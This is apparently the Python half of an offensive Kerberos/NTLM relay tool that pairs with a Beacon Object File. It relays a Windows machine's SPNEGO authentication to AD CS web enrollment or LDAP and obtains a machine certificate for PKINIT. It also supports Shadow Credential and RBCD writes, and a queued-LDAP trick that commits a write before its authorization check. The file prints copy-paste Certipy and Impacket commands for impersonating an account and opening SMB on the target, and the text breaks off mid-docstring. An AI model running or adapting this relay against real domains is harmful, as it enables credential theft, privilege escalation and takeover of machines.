#!/usr/bin/env python3
"""Kerberos/SPNEGO relay and target adapters for the KrbRelay BOF split.

The listener receives opaque DCE/RPC SPNEGO records over the KRB1 bridge and
places each one into one persistent HTTP or LDAP exchange. Target
continuations are returned unchanged to the BOF so Windows can complete the
client side of mutual Kerberos authentication. HTTPS can additionally issue a
machine certificate that Python uses in memory for Schannel-authenticated
Shadow Credential and RBCD writes to LDAPS.

Run with Certipy's virtual environment because it already contains
``cryptography``. The default path does not print or retain authentication
artifacts; ``--trace-spnego``, ``--export-pfx-b64``, and ``--pfx-out`` enable
the explicitly requested output or file.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import html
import os
import re
import socket
import ssl
import struct
import sys
import urllib.parse
from dataclasses import dataclass
from typing import Callable, Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID


# ---------------------------------------------------------------------------
# KRB1 protocol and shared records
# ---------------------------------------------------------------------------
# The wire format is documented in docs/protocol.md. Conservative limits keep
# a malformed peer or HTTP endpoint from forcing unbounded memory growth.
MAGIC = b"KRB1"
VERSION = 3
MSG_CLIENT_AUTH_TOKEN = 3
MSG_SERVER_AUTH_TOKEN = 4
MSG_AUTH_OK = 5
MSG_ERROR = 6
MAX_TOKEN = 65535
MAX_ERROR = 512
MAX_HEADER = 64 * 1024
MAX_BODY = 4 * 1024 * 1024
MAX_LDAP_MESSAGE = 4 * 1024 * 1024

MESSAGE_LIMITS = {
    MSG_CLIENT_AUTH_TOKEN: (1, MAX_TOKEN),
    MSG_SERVER_AUTH_TOKEN: (1, MAX_TOKEN),
    MSG_AUTH_OK: (0, 0),
    MSG_ERROR: (0, MAX_ERROR),
}


class RelayError(RuntimeError):
    """Expected protocol, transport, IIS, or certificate validation failure."""


@dataclass
class HttpResponse:
    """Normalized response preserving repeated header fields."""
    status: int
    headers: dict[str, list[str]]
    body: bytes

    def first(self, name: str) -> Optional[str]:
        values = self.headers.get(name.lower())
        return values[0] if values else None


@dataclass
class CertificateBundle:
    """Issued identity and matching in-memory key returned to the caller."""
    certificate: x509.Certificate
    private_key: rsa.RSAPrivateKey
    request_id: str


@dataclass
class RbcdUpdate:
    """Directory proof returned after granting one delegate account."""
    target: str
    delegate: str
    sid: str
    already_present: bool


@dataclass
class LdapBindResponse:
    """RFC4511 BindResponse fields needed by the relay state machine."""
    result_code: int
    server_credentials: Optional[bytes]
    diagnostic: str


class RecordChannel:
    """Length-prefixed KRB1 channel layered over one accepted TCP connection."""
    def __init__(self, sock: socket.socket):
        self.sock = sock
        # True after AUTH_OK is sent. At that point the BOF has returned and
        # later target-operation errors can be reported only by this process.
        self.bof_released = False

    def _read_exact(self, length: int) -> bytes:
        """Read exactly one framing unit despite normal TCP short reads."""
        out = bytearray()
        while len(out) != length:
            part = self.sock.recv(length - len(out))
            if not part:
                raise RelayError("bridge connection closed")
            out.extend(part)
        return bytes(out)

    def receive(self, allowed_kinds: set[int]) -> tuple[int, bytes]:
        """Validate kind and length for the current protocol state."""
        header = self._read_exact(12)
        magic, version, kind, reserved, length = struct.unpack("!4sBBHI", header)
        if magic != MAGIC or version != VERSION or reserved != 0:
            raise RelayError("invalid bridge header")
        if kind not in allowed_kinds:
            raise RelayError("unexpected bridge message for current state")
        minimum, maximum = MESSAGE_LIMITS.get(kind, (-1, -1))
        if not minimum <= length <= maximum:
            raise RelayError("invalid bridge payload length")
        return kind, self._read_exact(length)

    def send(self, kind: int, payload: bytes = b"") -> None:
        """Send one bounded KRB1 record in network byte order."""
        minimum, maximum = MESSAGE_LIMITS.get(kind, (-1, -1))
        if not minimum <= len(payload) <= maximum:
            raise RelayError("invalid bridge payload length")
        self.sock.sendall(struct.pack("!4sBBHI", MAGIC, VERSION, kind, 0, len(payload)) + payload)


# ---------------------------------------------------------------------------
# Minimal persistent HTTP transport
# ---------------------------------------------------------------------------
class RawHttpConnection:
    """Minimal persistent HTTP/1.1 client that exposes raw Negotiate headers.

    High-level Kerberos HTTP libraries establish their own credential context,
    which would defeat relay. This implementation deliberately handles only
    the response features IIS uses while retaining unread pipelined bytes.
    """
    def __init__(self, host: str, address: str, port: int, tls: bool = False):
        self.host = host
        raw = socket.create_connection((address, port), timeout=10)
        if tls:
            # The lab CA is not installed in the operator trust store. SNI
            # still carries the operator-selected AD CS hostname and the
            # Kerberos service SPN remains bound to that same hostname.
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            try:
                self.sock = context.wrap_socket(raw, server_hostname=host)
            except Exception:
                raw.close()
                raise
        else:
            self.sock = raw
        self.sock.settimeout(20)
        self.pending = bytearray()

    def close(self) -> None:
        self.sock.close()

    def request(
        self,
        method: str,
        path: str,
        body: bytes = b"",
        authorization: Optional[bytes] = None,
        authorization_scheme: str = "Negotiate",
        cookie: Optional[str] = None,
    ) -> HttpResponse:
        """Send one request, optionally carrying an opaque SPNEGO record."""
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.host}",
            "User-Agent: KrbRelayBOF/1",
            "Connection: keep-alive",
        ]
        if authorization is not None:
            headers.append(f"Authorization: {authorization_scheme} " + base64.b64encode(authorization).decode("ascii"))
        if cookie:
            headers.append("Cookie: " + cookie)
        if body:
            headers.extend(
                [
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {len(body)}",
                ]
            )
        wire = ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + body
        self.sock.sendall(wire)
        return self._response()

    def _until(self, delimiter: bytes, limit: int) -> bytes:
        while delimiter not in self.pending:
            if len(self.pending) >= limit:
                raise RelayError("HTTP field exceeds limit")
            part = self.sock.recv(8192)
            if not part:
                raise RelayError("ADCS closed the HTTP connection")
            self.pending.extend(part)
        pos = self.pending.index(delimiter) + len(delimiter)
        out = bytes(self.pending[:pos])
        del self.pending[:pos]
        return out

    def _fixed(self, length: int) -> bytes:
        if length > MAX_BODY:
            raise RelayError("HTTP body exceeds limit")
        while len(self.pending) < length:
            part = self.sock.recv(min(65536, length - len(self.pending)))
            if not part:
                raise RelayError("ADCS closed the HTTP body")
            self.pending.extend(part)
        out = bytes(self.pending[:length])
        del self.pending[:length]
        return out

    def _chunked(self) -> bytes:
        body = bytearray()
        while True:
            line = self._until(b"\r\n", 128)
            try:
                length = int(line[:-2].split(b";", 1)[0], 16)
            except ValueError as exc:
                raise RelayError("invalid chunked HTTP response") from exc
            if length == 0:
                # The normal no-trailer terminator is a single CRLF after the
                # zero-size line. Non-empty trailers end in CRLFCRLF.
                if self.pending.startswith(b"\r\n"):
                    del self.pending[:2]
                else:
                    self._until(b"\r\n\r\n", MAX_HEADER)
                return bytes(body)
            if len(body) + length > MAX_BODY:
                raise RelayError("HTTP body exceeds limit")
            body.extend(self._fixed(length))
            if self._fixed(2) != b"\r\n":
                raise RelayError("invalid HTTP chunk terminator")

    def _response(self) -> HttpResponse:
        """Parse one bounded HTTP response and leave subsequent bytes queued."""
        raw = self._until(b"\r\n\r\n", MAX_HEADER)
        lines = raw[:-4].decode("iso-8859-1").split("\r\n")
        try:
            status = int(lines[0].split(" ", 2)[1])
        except (IndexError, ValueError) as exc:
            raise RelayError("invalid HTTP status line") from exc
        headers: dict[str, list[str]] = {}
        for line in lines[1:]:
            if ":" not in line:
                raise RelayError("invalid HTTP header")
            key, value = line.split(":", 1)
            headers.setdefault(key.lower(), []).append(value.strip())
        if "chunked" in ",".join(headers.get("transfer-encoding", [])).lower():
            body = self._chunked()
        elif "content-length" in headers:
            body = self._fixed(int(headers["content-length"][0]))
        else:
            body = b""
        return HttpResponse(status, headers, body)


def authentication_blob(response: HttpResponse) -> Optional[bytes]:
    """Decode IIS's first non-empty HTTP Negotiate challenge."""
    for value in response.headers.get("www-authenticate", []):
        if not value.lower().startswith("negotiate "):
            continue
        encoded = value.split(" ", 1)[1].strip()
        try:
            return base64.b64decode(encoded, validate=True)
        except ValueError as exc:
            raise RelayError("invalid IIS Negotiate continuation") from exc
    return None


# ---------------------------------------------------------------------------
# Minimal persistent LDAP SASL transport
# ---------------------------------------------------------------------------
def ber_length(length: int) -> bytes:
    """Encode a non-negative DER/BER definite length."""
    if length < 0:
        raise RelayError("invalid LDAP field length")
    if length < 0x80:
        return bytes([length])
    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def ber_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + ber_length(len(value)) + value


def ber_integer(value: int) -> bytes:
    if value < 0:
        raise RelayError("invalid LDAP integer")
    raw = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
    if raw[0] & 0x80:
        raw = b"\x00" + raw
    return ber_tlv(0x02, raw)


def ber_element(data: bytes, offset: int) -> tuple[int, bytes, int]:
    """Decode one bounded, definite-length BER element."""
    if offset + 2 > len(data):
        raise RelayError("truncated LDAP response")
    tag = data[offset]
    first = data[offset + 1]
    if first < 0x80:
        length = first
        start = offset + 2
    else:
        count = first & 0x7F
        if not count or count > 4 or offset + 2 + count > len(data):
            raise RelayError("invalid LDAP BER length")
        start = offset + 2 + count
        length = int.from_bytes(data[offset + 2 : start], "big")
    end = start + length
    if end > len(data) or length > MAX_LDAP_MESSAGE:
        raise RelayError("invalid LDAP BER length")
    return tag, data[start:end], end


def ldap_sasl_bind(message_id: int, token: bytes) -> bytes:
    """Build an RFC4511 BindRequest carrying opaque GSS-SPNEGO credentials."""
    sasl = ber_tlv(0x04, b"GSS-SPNEGO") + ber_tlv(0x04, token)
    request = ber_tlv(0x02, b"\x03") + ber_tlv(0x04, b"") + ber_tlv(0xA3, sasl)
    return ber_tlv(0x30, ber_integer(message_id) + ber_tlv(0x60, request))


def ldap_message(wire: bytes, expected_message_id: int) -> tuple[int, bytes]:
    """Return the application operation from one matched LDAPMessage."""
    tag, message, consumed = ber_element(wire, 0)
    if tag != 0x30 or consumed != len(wire):
        raise RelayError("invalid LDAPMessage")
    tag, raw_id, offset = ber_element(message, 0)
    if tag != 0x02 or not raw_id or int.from_bytes(raw_id, "big") != expected_message_id:
        raise RelayError("unexpected LDAP message ID")
    operation_tag, operation, _ = ber_element(message, offset)
    return operation_tag, operation


def ldap_message_id(wire: bytes) -> int:
    """Extract an LDAP message ID when deliberately testing queued ordering."""
    tag, message, consumed = ber_element(wire, 0)
    if tag != 0x30 or consumed != len(wire):
        raise RelayError("invalid LDAPMessage")
    tag, raw_id, _offset = ber_element(message, 0)
    if tag != 0x02 or not raw_id:
        raise RelayError("invalid LDAP message ID")
    return int.from_bytes(raw_id, "big")


def ldap_result(operation: bytes) -> tuple[int, str]:
    """Decode the common LDAPResult fields used by bind/search/modify."""
    tag, result, offset = ber_element(operation, 0)
    if tag != 0x0A or not result:
        raise RelayError("invalid LDAP result")
    tag, _matched_dn, offset = ber_element(operation, offset)
    if tag != 0x04:
        raise RelayError("invalid LDAP matchedDN")
    tag, diagnostic, _ = ber_element(operation, offset)
    if tag != 0x04:
        raise RelayError("invalid LDAP diagnosticMessage")
    return int.from_bytes(result, "big"), diagnostic.decode("utf-8", errors="replace")


def parse_ldap_bind_response(wire: bytes, expected_message_id: int) -> LdapBindResponse:
    """Parse one RFC4511 BindResponse, including optional serverSaslCreds."""
    tag, message, consumed = ber_element(wire, 0)
    if tag != 0x30 or consumed != len(wire):
        raise RelayError("invalid LDAPMessage")
    tag, raw_id, offset = ber_element(message, 0)
    if tag != 0x02 or not raw_id or int.from_bytes(raw_id, "big") != expected_message_id:
        raise RelayError("unexpected LDAP message ID")
    tag, bind, _ = ber_element(message, offset)
    if tag != 0x61:
        raise RelayError("LDAP response was not a BindResponse")
    tag, result, offset = ber_element(bind, 0)
    if tag != 0x0A or not result:
        raise RelayError("invalid LDAP bind result")
    tag, _matched_dn, offset = ber_element(bind, offset)
    if tag != 0x04:
        raise RelayError("invalid LDAP matchedDN")
    tag, diagnostic, offset = ber_element(bind, offset)
    if tag != 0x04:
        raise RelayError("invalid LDAP diagnosticMessage")
    server_credentials = None
    while offset < len(bind):
        tag, value, offset = ber_element(bind, offset)
        if tag == 0x87:
            server_credentials = value
    return LdapBindResponse(
        int.from_bytes(result, "big"), server_credentials,
        diagnostic.decode("utf-8", errors="replace"),
    )


class RawLdapConnection:
    """Persistent LDAP client exposing opaque GSS-SPNEGO SASL exchanges."""
    def __init__(self, address: str, port: int, tls_hostname: Optional[str] = None,
                 connected_socket: Optional[socket.socket] = None,
                 tls_context: Optional[ssl.SSLContext] = None):
        self.sock = connected_socket or socket.create_connection((address, port), timeout=10)
        if tls_hostname:
            context = tls_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if tls_context is None:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            self.sock = context.wrap_socket(self.sock, server_hostname=tls_hostname)
        self.sock.settimeout(20)
        self.message_id = 0

    def close(self) -> None:
        self.sock.close()

    def _read_exact(self, length: int) -> bytes:
        out = bytearray()
        while len(out) < length:
            part = self.sock.recv(length - len(out))
            if not part:
                raise RelayError("LDAP server closed the connection")
            out.extend(part)
        return bytes(out)

    def _response(self) -> bytes:
        prefetched = getattr(self, "_prefetched_responses", None)
        if prefetched:
            return prefetched.pop(0)
        header = self._read_exact(2)
        if header[0] != 0x30:
            raise RelayError("invalid LDAPMessage")
        first = header[1]
        if first < 0x80:
            length_bytes = b""
            length = first
        else:
            count = first & 0x7F
            if not count or count > 4:
                raise RelayError("invalid LDAP BER length")
            length_bytes = self._read_exact(count)
            length = int.from_bytes(length_bytes, "big")
        if length > MAX_LDAP_MESSAGE:
            raise RelayError("LDAP response exceeds limit")
        return header + length_bytes + self._read_exact(length)

    def bind(self, token: bytes) -> LdapBindResponse:
        self.message_id += 1
        self.sock.sendall(ldap_sasl_bind(self.message_id, token))
        return parse_ldap_bind_response(self._response(), self.message_id)

    def bind_with_prefetched_requests(
        self, token: bytes, requests: list[tuple[int, bytes]],
    ) -> tuple[LdapBindResponse, list[tuple[int, int]]]:
        """Place complete operations ahead of the final bind in one TCP write.

        AD dispatches already-read LDAP messages on separate workers. Queuing
        the write while the SASL bind is still in progress lets the final bind
        commit before the write's authorization check, and avoids sending a
        new unsigned message after packet integrity becomes active. Responses
        can arrive in either message-ID order, so normalize them for the
        result validator.
        """
        bind_id = self.message_id + 1
        packet = bytearray()
        ids = []
        next_id = bind_id
        for operation_tag, body in requests:
            next_id += 1
            ids.append((next_id, operation_tag + 1))
            packet.extend(ber_tlv(
                0x30,
                ber_integer(next_id) + ber_tlv(operation_tag, body),
            ))
        packet.extend(ldap_sasl_bind(bind_id, token))
        self.sock.sendall(packet)

        bind = None
        operation_responses = []
        for _index in range(len(ids) + 1):
            response = self._response()
            if ldap_message_id(response) == bind_id:
                bind = parse_ldap_bind_response(response, bind_id)
            else:
                operation_responses.append(response)
        if bind is None:
            raise RelayError("queued LDAP exchange returned no BindResponse")
        self.message_id = next_id
        self._prefetched_responses = operation_responses
        return bind, ids

# ---------------------------------------------------------------------------
# NTLM-over-HTTP-Negotiate compatibility
#
# The intended path carries a complete SPNEGO/Kerberos token unchanged. RPC's
# Negotiate provider can instead expose raw NTLMSSP. These two helpers perform
# only the required HTTP Negotiate wrapper adaptation for that case.
# ---------------------------------------------------------------------------
def der_value(tag: int, content: bytes) -> bytes:
    """Encode one bounded DER TLV used to carry NTLM inside HTTP Negotiate."""
    length = len(content)
    if length < 0x80:
        size = bytes([length])
    else:
        raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
        size = bytes([0x80 | len(raw)]) + raw
    return bytes([tag]) + size + content


def wrap_ntlm_negotiate(token: bytes, initial: bool) -> bytes:
    """Wrap a raw RPC NTLMSSP leg in the SPNEGO form expected by IIS."""
    if not token.startswith(b"NTLMSSP\x00"):
        raise RelayError("invalid RPC NTLMSSP token")
    response_token = der_value(0xA2, der_value(0x04, token))
    if not initial:
        return der_value(0xA1, der_value(0x30, response_token))
    spnego_oid = der_value(0x06, b"\x2b\x06\x01\x05\x05\x02")
    ntlm_oid = der_value(0x06, b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a")
    mech_types = der_value(0xA0, der_value(0x30, ntlm_oid))
    return der_value(0x60, spnego_oid + der_value(0xA0, der_value(0x30, mech_types + response_token)))


def unwrap_ntlm_negotiate(token: bytes) -> bytes:
    """Extract the raw NTLM challenge that the RPC NTLM provider consumes."""
    offset = token.find(b"NTLMSSP\x00")
    if offset < 0 or len(token) - offset < 12:
        raise RelayError("IIS Negotiate continuation does not contain NTLMSSP")
    raw = token[offset:]
    if int.from_bytes(raw[8:12], "little") == 2 and len(raw) >= 48:
        end = 48
        for field in (12, 40):
            length = int.from_bytes(raw[field : field + 2], "little")
            pointer = int.from_bytes(raw[field + 4 : field + 8], "little")
            if pointer + length > end:
                end = pointer + length
        if end <= len(raw):
            return raw[:end]
    return raw


# ---------------------------------------------------------------------------
# Optional token diagnostics
# ---------------------------------------------------------------------------
def der_bounds(data: bytes, offset: int) -> Optional[tuple[int, int]]:
    """Return bounded DER content offsets for lightweight diagnostics only."""
    if offset + 2 > len(data):
        return None
    first = data[offset + 1]
    if first < 0x80:
        start = offset + 2
        end = start + first
    else:
        count = first & 0x7F
        if not count or count > 4 or offset + 2 + count > len(data):
            return None
        start = offset + 2 + count
        end = start + int.from_bytes(data[offset + 2 : start], "big")
    return (start, end) if end <= len(data) else None


def kerberos_tlv(data: bytes, wanted_tag: int) -> bytes:
    """Extract the first complete Kerberos AP application TLV."""
    for offset, tag in enumerate(data):
        if tag != wanted_tag:
            continue
        bounds = der_bounds(data, offset)
        if bounds:
            return data[offset:bounds[1]]
    raise RelayError(f"SPNEGO token did not contain Kerberos tag 0x{wanted_tag:02x}")


def ldap_kerberos_token(token: bytes, leg: int) -> bytes:
    """Adapt RPC SPNEGO to WinLDAP's relay-compatible Kerberos token form.

    WinLDAP accepts a direct GSS Kerberos token for leg one. For later legs it
    needs only the AP-REP from RPC's NegTokenResp; the adjacent SPNEGO MIC is
    specific to the source context and is deliberately not sent to LDAP.
    """
    if leg == 1:
        krb5_oid_and_token_id = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x01\x00"
        return der_value(0x60, krb5_oid_and_token_id + kerberos_tlv(token, 0x6E))
    ap_rep_offset = token.find(b"\x6f")
    if ap_rep_offset < 0:
        raise RelayError("SPNEGO continuation did not contain an AP-REP")
    # Validate that the candidate is one complete AP-REP and omit any trailing
    # RPC/SPNEGO fields that do not belong to the target context.
    ap_rep_bounds = der_bounds(token, ap_rep_offset)
    if not ap_rep_bounds:
        raise RelayError("SPNEGO continuation contained a truncated AP-REP")
    return token[ap_rep_offset:ap_rep_bounds[1]]


def ldap_rpc_continuation(token: bytes) -> bytes:
    """Wrap WinLDAP's AP-REP with RPC's selected Microsoft Kerberos mech."""
    if not token.startswith(b"\x6f"):
        return token
    neg_state = der_value(0xA0, der_value(0x0A, b"\x01"))
    # RPC's Negotiate package selects the Microsoft legacy Kerberos OID from
    # the client's offered mechanisms, unlike WinLDAP's standard KRB5 OID.
    supported_mech = der_value(
        0xA1, der_value(0x06, b"\x2a\x86\x48\x82\xf7\x12\x01\x02\x02")
    )
    response_token = der_value(0xA2, der_value(0x04, token))
    return der_value(0xA1, der_value(0x30, neg_state + supported_mech + response_token))


def spnego_state(token: bytes) -> str:
    """Extract negState for logging; token forwarding never depends on it."""
    states = {0: "accept-completed", 1: "accept-incomplete", 2: "reject", 3: "request-mic"}
    for offset in range(max(0, len(token) - 4)):
        if token[offset : offset + 4] == b"\xa0\x03\x0a\x01":
            return states.get(token[offset + 4], f"unknown-{token[offset + 4]}")
    return "not-present"


def kerberos_inner(token: bytes) -> tuple[str, Optional[int]]:
    """Identify AP-REQ/AP-REP/KRB-ERROR inside SPNEGO for operator context."""
    tags = {0x6E: "AP-REQ", 0x6F: "AP-REP", 0x7E: "KRB-ERROR"}
    for offset, tag in enumerate(token):
        if tag != 0x04:
            continue
        bounds = der_bounds(token, offset)
        if not bounds:
            continue
        start, end = bounds
        if start >= end or token[start] not in tags:
            continue
        name = tags[token[start]]
        if name != "KRB-ERROR":
            return name, None
        inner_bounds = der_bounds(token, start)
        if not inner_bounds:
            return name, None
        for field in range(inner_bounds[0], inner_bounds[1] - 3):
            if token[field] != 0xA6:
                continue
            field_bounds = der_bounds(token, field)
            if not field_bounds or token[field_bounds[0]] != 0x02:
                continue
            value_bounds = der_bounds(token, field_bounds[0])
            if value_bounds:
                return name, int.from_bytes(token[value_bounds[0] : value_bounds[1]], "big")
        return name, None
    return "not-detected", None


def describe_spnego(token: bytes) -> str:
    """Summarize a token without claiming full ASN.1 validation."""
    top_levels = {
        0x60: "GSS-API InitialContextToken",
        0xA0: "NegTokenInit choice",
        0xA1: "NegTokenResp choice",
    }
    top = top_levels.get(token[0], f"ASN.1 tag 0x{token[0]:02x}") if token else "empty"
    spnego_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02" in token
    kerberos_oid = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02" in token
    inner, error_code = kerberos_inner(token)
    error = f"; kerberos_error={error_code}" if error_code is not None else ""
    return (
        f"top={top}; bytes={len(token)}; negState={spnego_state(token)}; "
        f"SPNEGO_OID={'yes' if spnego_oid else 'no'}; Kerberos_OID={'yes' if kerberos_oid else 'no'}; "
        f"inner={inner}{error}"
    )


def print_spnego(direction: str, leg: int, token: bytes) -> None:
    """Explicitly sensitive trace mode: metadata plus complete base64 token."""
    print(f"[SPNEGO] {direction} leg={leg}; {describe_spnego(token)}", flush=True)
    print(f"SPNEGO_{direction}_{leg}_B64={base64.b64encode(token).decode('ascii')}", flush=True)


def trace_name(value: str) -> str:
    """Make a runtime host/principal value safe for a shell-style trace label."""
    label = re.sub(r"[^A-Za-z0-9]+", "_", value).strip("_").upper()
    return label or "PEER"


# ---------------------------------------------------------------------------
# ADCS certificate validation and optional artifact output
# ---------------------------------------------------------------------------
def serialize_pfx(bundle: CertificateBundle, machine: str) -> bytes:
    """Create a passwordless PKCS#12 only after key/certificate verification."""
    return pkcs12.serialize_key_and_certificates(
        name=f"{machine}$".encode("ascii"),
        key=bundle.private_key,
        cert=bundle.certificate,
        cas=None,
        encryption_algorithm=serialization.NoEncryption(),
    )


def print_pfx(pfx: bytes, options: argparse.Namespace, pfx_path: str) -> None:
    """Emit explicit artifact reconstruction and parameterized follow-ons."""
    machine = options.machine
    domain = options.domain
    encoded = base64.b64encode(pfx).decode("ascii")
    lower_machine = machine.lower()
    artifact_dir = os.path.dirname(os.path.abspath(pfx_path))
    print("[PFX] Copy/paste this block, then replace the angle-bracket placeholders", flush=True)
    print(f"PFX_B64='{encoded}'", flush=True)
    print(f"printf '%s' \"$PFX_B64\" | base64 -d > '{pfx_path}'", flush=True)
    print("unset KRB5CCNAME", flush=True)
    print(f"cd '{artifact_dir}'", flush=True)
    print(
        f"/home/kali/Tools/Certipy/.venv/bin/certipy auth -pfx '{pfx_path}' "
        f"-username '{machine}$' -domain {domain} -dc-ip <DC-IP> -no-hash",
        flush=True,
    )
    print(f"export KRB5CCNAME={lower_machine}.ccache", flush=True)
    print(
        "/home/kali/Tools/impacket-0.13.1/.venv/bin/python "
        "/home/kali/Tools/impacket-0.13.1/examples/getST.py -k -no-pass "
        f"-dc-ip <DC-IP> -impersonate <IMPERSONATE-ACCOUNT> -self "
        f"-altservice cifs/{machine} "
        f"'{domain}/{machine}$'",
        flush=True,
    )
    print(f"export KRB5CCNAME='<IMPERSONATE-ACCOUNT>@cifs_{machine}@{domain.upper()}.ccache'", flush=True)
    print(
        "/home/kali/Tools/impacket-0.13.1/.venv/bin/python "
        "/home/kali/Tools/impacket-0.13.1/examples/smbclient.py -k -no-pass "
        f"-dc-ip <DC-IP> -target-ip <TARGET-IP> "
        f"'{domain}/<IMPERSONATE-ACCOUNT>@{machine}'",
        flush=True,
    )


def load_issued_certificate(body: bytes) -> x509.Certificate:
    """Accept the DER, PEM, or PEM-wrapped response forms used by Web Enrollment."""
    stripped = body.strip()
    if stripped.startswith(b"-----BEGIN CERTIFICATE-----"):
        return x509.load_pem_x509_certificate(stripped)
    try:
        return x509.load_der_x509_certificate(stripped)
    except ValueError:
        text = stripped.decode("ascii", errors="ignore")
        match = re.search(
            r"-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----",
            text,
            flags=re.DOTALL,
        )
        if not match:
            raise RelayError("ADCS returned an unrecognized certificate")
        return x509.load_pem_x509_certificate(match.group(0).encode("ascii"))


def request_id_from_body(body: bytes) -> Optional[str]:
    """Extract the CA request ID from normal, pending, or denied HTML."""
    for pattern in (
        rb"certnew\.cer\?ReqID=([0-9]+)&",
        rb"Your Request Id is ([0-9]+)",
        rb"ReqID=([0-9]+)",
    ):
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            return match.group(1).decode("ascii", errors="strict")
    return None


def adcs_error_detail(body: bytes) -> str:
    """Reduce CA HTML to a non-sensitive policy/error reason for the BOF."""
    decoded = body.decode("utf-8", errors="replace")
    plain = html.unescape(re.sub(r"<[^>]+>", " ", decoded))
    plain = re.sub(r"\s+", " ", plain).strip()
    code_match = re.search(r"0x[0-9a-fA-F]{8}", plain)
    code = code_match.group(0).lower() if code_match else None
    known = {
        "0x80094012": "template permissions do not allow this principal to enroll",
        "0x80094014": "the requested certificate subject is invalid",
        "0x80094800": "the requested certificate template is not supported by this CA",
        "0x80094801": "the request did not contain a certificate template",
        "0x8009480f": "a required subject DNS name is unavailable",
    }
    if code in known:
        return f"{code}: {known[code]}"
    candidates = (
        r"Denied by Policy Module.{0,320}",
        r"The requested certificate template.{0,260}",
        r"The permissions on the certificate template.{0,260}",
        r"The request was denied.{0,260}",
        r"Error Number:.{0,160}",
    )
    for pattern in candidates:
        match = re.search(pattern, plain, re.IGNORECASE)
        if match:
            return match.group(0).strip()
    return code or "the CA returned a denial without a recognizable reason"


def http_error_detail(body: bytes) -> str:
    """Reduce an IIS error document to one bounded troubleshooting line."""
    if not body:
        return "empty response body"
    decoded = body.decode("utf-8", errors="replace")
    plain = html.unescape(re.sub(r"<[^>]+>", " ", decoded))
    plain = re.sub(r"\s+", " ", plain).strip()
    return plain[:MAX_ERROR] or "unparseable response body"


# ---------------------------------------------------------------------------
# Relay/enrollment orchestration
# ---------------------------------------------------------------------------
def enroll(
    conn: RawHttpConnection,
    domain: str,
    machine: str,
    template: str,
    enroll_path: str,
    certificate_path: str,
    cookie: Optional[str],
    log: Callable[[str], None],
) -> CertificateBundle:
    """Enroll through an already-authenticated connection and verify the result.

    The RSA private key never leaves Python memory unless the operator selected
    PFX output. The CSR requests the runtime template, and retrieval uses the
    same IIS session/cookie established by the relayed machine authentication.
    """
    log(f"Generating an in-memory RSA key and CSR for {domain}\\{machine}$")
    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, f"{domain}\\{machine}$")]))
        .sign(key, hashes.SHA256())
    )
    pem = csr.public_bytes(serialization.Encoding.PEM).decode("ascii").replace("\n", "")
    body = urllib.parse.urlencode(
        {
            "Mode": "newreq",
            "CertRequest": pem,
            "CertAttrib": f"CertificateTemplate:{template}",
            "TargetStoreFlags": "0",
            "SaveCert": "yes",
            "ThumbPrint": "",
        }
    ).encode("ascii")
    log(f"Submitting the CSR to {enroll_path} using template {template!r}")
    response = conn.request("POST", enroll_path, body, cookie=cookie)
    if response.status != 200:
        raise RelayError(f"certificate submission returned HTTP {response.status}")
    request_id = request_id_from_body(response.body)
    # A denied request can still have a CA request ID. Querying its status does
    # not submit another request and often yields the useful policy HRESULT.
    if b"locDenied" in response.body:
        detail = adcs_error_detail(response.body)
        if request_id:
            separator = "&" if "?" in certificate_path else "?"
            denial_response = conn.request(
                "GET", certificate_path + separator + urllib.parse.urlencode({"ReqID": request_id}), cookie=cookie
            )
            retrieved_detail = adcs_error_detail(denial_response.body)
            if "unrecognizable reason" not in retrieved_detail:
                detail = retrieved_detail
        label = f" request {request_id}" if request_id else ""
        raise RelayError(f"certificate{label} denied: {detail}")
    if not request_id:
        if b"Denied by Policy Module" in response.body:
            raise RelayError(f"certificate request denied by policy: {adcs_error_detail(response.body)}")
        if b"Certificate Pending" in response.body:
            raise RelayError("certificate request is pending")
        raise RelayError("certificate response did not contain a request ID")
    log(f"ADCS issued request {request_id}; retrieving the certificate on the authenticated connection")
    separator = "&" if "?" in certificate_path else "?"
    certificate_response = conn.request("GET", certificate_path + separator + urllib.parse.urlencode({"ReqID": request_id}), cookie=cookie)
    if certificate_response.status != 200:
        raise RelayError(f"certificate retrieval returned HTTP {certificate_response.status}")
    # Possessing an issued certificate alone is insufficient: ensure the
    # returned public key matches our private key and allows client auth/PKINIT.
    certificate = load_issued_certificate(certificate_response.body)
    cert_public = certificate.public_key().public_numbers()
    private_public = key.public_key().public_numbers()
    if cert_public != private_public:
        raise RelayError("issued certificate does not match the private key")
    log("Verified that the issued certificate matches the in-memory private key")
    try:
        usages = certificate.extensions.get_extension_for_class(x509.ExtendedKeyUsage).value
    except x509.ExtensionNotFound:
        usages = []
    if ExtendedKeyUsageOID.CLIENT_AUTH not in usages:
        raise RelayError("issued certificate is missing client-authentication usage")
    log("Verified client-authentication EKU")
    return CertificateBundle(certificate, key, request_id)


def run_session(channel: RecordChannel, options: argparse.Namespace) -> CertificateBundle:
    """Drive one mutual Negotiate session and enroll once IIS authenticates.

    The IIS probe, all 401 continuations, the final 200, CSR submission, and
    certificate retrieval share one RawHttpConnection. Reconnecting would
